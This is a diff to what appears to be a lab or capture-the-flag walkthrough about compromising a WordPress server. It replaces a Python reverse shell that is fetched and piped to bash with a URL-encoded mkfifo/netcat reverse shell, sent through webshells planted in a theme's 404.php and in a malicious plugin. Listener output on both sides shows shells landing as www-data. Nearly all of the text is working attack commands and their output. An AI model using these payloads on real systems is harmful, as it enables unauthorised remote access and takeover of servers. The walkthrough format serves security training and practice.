@@ -111,31 +111,22 @@ curl -sk "http://10.49.131.138/wordpress/wp-content/themes/twentytwenty/404.php?
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Ports 4444, 443, and 9001 are blocked — use port 8080. Write the reverse shell to a file and serve it over HTTP:
+Start a listener:
 
 ```bash
-cat > shell.sh <<'EOF'
-python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.240.231',8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
-EOF
-python3 -m http.server 9090
+nc -nlvp 4444
 ```
 
-Open a second terminal and start the listener:
+Deliver the reverse shell directly through the webshell — no HTTP server needed. URL-encode the mkfifo payload and pass it as the `cmd` parameter:
 
 ```bash
-nc -nlvp 8080
-```
-
-Use the webshell to make the target fetch and execute the shell:
-
-```bash
-curl -sk "http://10.49.131.138/wordpress/wp-content/themes/twentytwenty/404.php?cmd=curl+http://192.168.240.231:9090/shell.sh|bash"
+curl -sk "http://10.49.131.138/wordpress/wp-content/themes/twentytwenty/404.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.240.231%204444%20%3E%2Ftmp%2Ff"
 ```
 
 Shell lands:
 
 ```
-listening on [any] 8080 ...
+listening on [any] 4444 ...
 connect to [192.168.240.231] from (UNKNOWN) [10.49.131.138] 54312
 www-data@ip-10-49-131-138:/var/www/html/wordpress/wp-content/themes/twentytwenty$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -183,16 +174,16 @@ EOF
 zip -r malicious.zip malicious/
 ```
 
-With the `nc` listener running on port 8080 and `shell.sh` served on port 9090 (same setup as Method A), trigger the shell via the plugin webshell:
+With the `nc` listener running on port 4444, trigger the shell via the plugin webshell:
 
 ```bash
-curl -sk "http://10.49.131.138/wordpress/wp-content/plugins/malicious/webshell.php?cmd=curl+http://192.168.240.231:9090/shell.sh|bash"
+curl -sk "http://10.49.131.138/wordpress/wp-content/plugins/malicious/webshell.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.240.231%204444%20%3E%2Ftmp%2Ff"
 ```
 
 Shell lands:
 
 ```
-listening on [any] 8080 ...
+listening on [any] 4444 ...
 connect to [192.168.240.231] from (UNKNOWN) [10.49.131.138] 54318
 www-data@ip-10-49-131-138:/var/www/html/wordpress/wp-content/plugins/malicious$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
